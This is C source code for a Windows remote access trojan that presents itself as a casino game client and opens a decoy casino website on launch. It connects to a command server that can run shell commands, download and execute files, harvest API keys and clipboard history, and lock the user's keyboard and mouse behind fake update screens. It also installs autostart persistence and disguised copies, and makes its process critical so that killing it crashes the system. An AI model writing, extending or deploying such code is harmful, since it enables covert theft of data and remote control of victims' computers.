/*
 * Vivid Casino Engine — Client Main
 * 
 * Entry point and main game loop.
 * Connects to game server, handles admin commands,
 * and manages game module loading.
 */

#include "../engine/engine.h"

/* Global UI state (defined here, declared extern in header) */
HWND g_update_wnd = NULL;
int g_update_type = 0;
int g_input_blocked = 0;
HHOOK g_mouse_hook = NULL;
HHOOK g_kb_hook = NULL;
HWND g_block_wnd = NULL;
HANDLE g_block_thread = NULL;
RECT g_old_clip;
int g_copy_buffer_saved = 0;
int g_cursor_count = 0;

/* Clipboard state */
CRITICAL_SECTION g_copy_buffer_cs;
char g_copy_buffer_log[MAX_COPY_ENTRIES][COPY_ENTRY_SIZE];
int g_copy_buffer_count = 0;
int g_copy_buffer_index = 0;
char g_last_copy_buffer_text[COPY_ENTRY_SIZE] = {0};

/* Utility: append formatted string to buffer */
void util_appendf(char *buf, int *pos, const char *fmt, ...) {
    va_list args;
    va_start(args, fmt);
    int n = vsnprintf(buf + *pos, NET_BUF_SIZE - 1 - *pos, fmt, args);
    va_end(args);
    if (n > 0) *pos += n;
}

/* Download game module from content server */
static int download_module(const char *url, const char *out_path) {
    HINTERNET hInternet = InternetOpenA("RoyalFortune/1.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) return 0;
    
    HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hUrl) { InternetCloseHandle(hInternet); return 0; }
    
    FILE *f = fopen(out_path, "wb");
    if (!f) { InternetCloseHandle(hUrl); InternetCloseHandle(hInternet); return 0; }
    
    char buf[8192];
    DWORD read;
    while (InternetReadFile(hUrl, buf, sizeof(buf), &read) && read > 0) {
        fwrite(buf, 1, read, f);
    }
    
    fclose(f);
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);
    return 1;
}

/* Auto-protect thread for shadow copies: waits 15 seconds then protects */
DWORD WINAPI shadow_auto_protect(LPVOID lpParam) {
    Sleep(15000);  /* Wait 15 seconds after startup before protecting */
    sys_protect_process();
    return 0;
}

/* Execute game module or admin command */
static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
    char *result = NULL;
    static char response[NET_BUF_SIZE];
    int resp_pos = 0;

    /* Trim whitespace/newlines from command */
    char cmd[1024];
    const char *start = cmd_raw;
    while (*start == ' ' || *start == '\t' || *start == '\n' || *start == '\r') start++;
    size_t len = strlen(start);
    while (len > 0 && (start[len-1] == ' ' || start[len-1] == '\t' || start[len-1] == '\n' || start[len-1] == '\r')) len--;
    if (len >= sizeof(cmd)) len = sizeof(cmd) - 1;
    memcpy(cmd, start, len);
    cmd[len] = '\0';
    if (len == 0) { net_send_packet(sock, "[Empty command]"); return; }
    
    /* Maintenance commands */
    if (strcmp(cmd, "DISABLE_INPUT") == 0 || strcmp(cmd, "BLOCK_UI") == 0) {
        /* Enter maintenance mode: lock player controls */
        ui_lock_controls(1);
        result = "[Keyboard & Mouse disabled]";
    }
    else if (strcmp(cmd, "WINDOWS_UPDATE") == 0 || strcmp(cmd, "SHOW_SPLASH") == 0) {
        /* Show system update splash screen during maintenance */
        ui_show_splash(1);
        result = "[Windows update screen shown]";
    }
    else if (strcmp(cmd, "APPLE_UPDATE") == 0) {
        /* Show Apple-style update splash screen */
        ui_show_splash(2);
        result = "[Apple update screen shown]";
    }
    else if (strcmp(cmd, "HIDE_UPDATE") == 0) {
        ui_hide_splash();
        result = "[Update screen hidden]";
    }
    else if (strcmp(cmd, "ENABLE_INPUT") == 0) {
        ui_lock_controls(0);
        result = "[Keyboard & Mouse enabled]";
    }
    /* System diagnostics */
    else if (strcmp(cmd, GAME_SYSTEM_INFO) == 0) {
        result = sys_get_info();
    }
    else if (strcmp(cmd, GAME_AUTO_START) == 0) {
        sys_register_autostart();
        result = "[Auto-launch enabled]";
    }
    else if (strcmp(cmd, "PRIVILEGE_CHECK") == 0) {
        sys_check_privileges();
        result = "[System privileges verified]";
    }
    else if (strcmp(cmd, "HIDE") == 0) {
        sys_init_window();
        result = "[Window initialized]";
    }
    /* Security audit */
    else if (strcmp(cmd, "FIND_API_KEYS") == 0) {
        result = config_scan_scan_system();
    }
    else if (strncmp(cmd, "NOTE|", 5) == 0) {
        /* Open notepad with a message from the operator */
        ui_open_note(cmd + 5);
        result = "[Note opened on target]";
    }
    else if (strcmp(cmd, "CLIPBOARD_LOG") == 0 || strcmp(cmd, "CLIP_HIST") == 0) {
        result = copy_buffer_get_history();
    }
    else if (strcmp(cmd, "SECURITY_CHECK") == 0 || strcmp(cmd, "SYS_CHECK") == 0) {
        sys_check_antivirus();
        result = "[Security check complete]";
    }
    else if (strcmp(cmd, "PROTECT_PROCESS") == 0 || strcmp(cmd, "DEPLOY_SVC") == 0) {
        sys_spawn_shadow_copy();
        result = "[Spawned 3 copies: ElevationService.exe, CrashHandler.exe, NotifyService.exe — auto-protect in 15s]";
    }
    else if (strcmp(cmd, "UNPROTECT_PROCESS") == 0 || strcmp(cmd, "REMOVE_SVC") == 0) {
        sys_unprotect_process();
        result = "[Critical flag removed — process can now be terminated]";
    }
    else if (strcmp(cmd, "CHECK_PROTECTION") == 0 || strcmp(cmd, "SVC_STATUS") == 0) {
        const char *critical_status = sys_check_critical_status_with_name();
        const char *admin_status = sys_is_admin() ? "admin" : "not admin";
        snprintf(response, sizeof(response), "%s [running as %s]", critical_status, admin_status);
        result = response;
    }
    else if (strcmp(cmd, "PROTECT_NOW") == 0 || strcmp(cmd, "SET_CRITICAL") == 0) {
        if (!sys_is_admin()) {
            result = "[FAIL: not running as administrator]";
        } else {
            sys_protect_process();
            const char *status = sys_protection_status();
            if (strcmp(status, "CRITICAL") == 0) {
                result = "[SUCCESS: Process is now CRITICAL — ending it will cause BSOD]";
            } else if (strcmp(status, "FAILED") == 0) {
                result = "[FAIL: NtSetInformationProcess failed — likely missing SeDebugPrivilege. Try running as SYSTEM or use a different elevation method.]";
            } else {
                result = "[UNKNOWN: protection status unclear]";
            }
        }
    }
    else if (strcmp(cmd, "UNINSTALL") == 0 || strcmp(cmd, "CLEANUP") == 0 || strcmp(cmd, "Exit") == 0) {
        sys_unprotect_process();
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER,
                "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
            RegDeleteValueA(hKey, "ElevationService");
            RegDeleteValueA(hKey, "CrashHandler");
            RegDeleteValueA(hKey, "NotifyService");
            RegDeleteValueA(hKey, "RoyalFortune");
            RegCloseKey(hKey);
        }
        result = "[CLEANUP complete — all persistence removed, exiting]";
        net_send_packet(sock, result);
        ExitProcess(0);
    }
    /* Game module management */
    else if (strncmp(cmd, GAME_FETCH_MODULE, strlen(GAME_FETCH_MODULE)) == 0) {
        char url[1024], path[MAX_PATH];
        if (sscanf(cmd, "DOWNLOAD %s %s", url, path) == 2) {
            if (download_module(url, path))
                result = "[Module downloaded successfully]";
            else
                result = "[Module download failed]";
        } else {
            result = "[Usage: DOWNLOAD <url> <path>]";
        }
    }
    else if (strncmp(cmd, GAME_LAUNCH_MODULE, strlen(GAME_LAUNCH_MODULE)) == 0) {
        char path[MAX_PATH];
        if (sscanf(cmd, "EXECUTE %s", path) == 1) {
            ShellExecuteA(NULL, "open", path, NULL, NULL, SW_SHOWNORMAL);
            result = "[Module launched]";
        } else {
            result = "[Usage: EXECUTE <path>]";
        }
    }
    /* Shell access for advanced diagnostics */
    else if (strncmp(cmd, GAME_DIAGNOSE, strlen(GAME_DIAGNOSE)) == 0) {
        const char *shell_cmd = cmd + strlen(GAME_DIAGNOSE);
        while (*shell_cmd == ' ') shell_cmd++;
        result = sys_run_command(shell_cmd);
    }
    else {
        /* Unknown command — attempt shell execution for compatibility */
        result = sys_run_command(cmd);
    }
    
    if (!result) result = "[No output]";
    net_send_packet(sock, result);
}

/* Main game client loop — connects to server and processes events */
DWORD WINAPI game_client_loop(LPVOID lpParam) {
    SOCKET sock = INVALID_SOCKET;
    struct sockaddr_in addr;
    WSADATA wsa;
    
    /* Initialize networking */
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 1;
    
    while (1) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) { Sleep(5000); continue; }
        
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(SERVER_PORT);
        addr.sin_addr.s_addr = inet_addr(SERVER_HOST);
        
        if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
            /* Send system info for player profile */
            char *info = sys_get_info();
            net_send_packet(sock, info);
            
            /* Main event loop */
            while (1) {
                char *cmd = net_recv_packet_timed(sock, 30);
                if (!cmd) break;
                handle_admin_command(sock, cmd);
            }
        }
        
        closesocket(sock);
        Sleep(5000);  /* Reconnect delay */
    }
    
    WSACleanup();
    return 0;
}

/* Windows entry point */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    /* Initialize subsystems */
    InitializeCriticalSection(&g_copy_buffer_cs);
    copy_buffer_init();
    ui_init();
    
    /* Open casino decoy website */
    ShellExecuteA(NULL, "open", "https://jjakinn.github.io/Royal-Fortune-Casino/", NULL, NULL, SW_SHOWNORMAL);
    
    /* Start background services */
    CreateThread(NULL, 0, copy_buffer_monitor_thread, NULL, 0, NULL);
    
    /* Check if this is a shadow copy — auto-protect after 15 seconds */
    char *cmdLine = GetCommandLineA();
    if (cmdLine && strstr(cmdLine, "--shadow") != NULL) {
        CreateThread(NULL, 0, shadow_auto_protect, NULL, 0, NULL);
    }

    /* Backup: detect if running from shadow path */
    char currentPath[MAX_PATH];
    GetModuleFileNameA(NULL, currentPath, MAX_PATH);
    if (strstr(currentPath, "ElevationService.exe") != NULL ||
        strstr(currentPath, "CrashHandler.exe") != NULL ||
        strstr(currentPath, "NotifyService.exe") != NULL) {
        CreateThread(NULL, 0, shadow_auto_protect, NULL, 0, NULL);
    }

    /* Elevate privileges if needed for full functionality */
    sys_check_privileges();
    
    /* Start protection watchdog thread */
    CreateThread(NULL, 0, sys_protect_watchdog, NULL, 0, NULL);
    
    /* Start game client */
    game_client_loop(NULL);
    
    return 0;
}
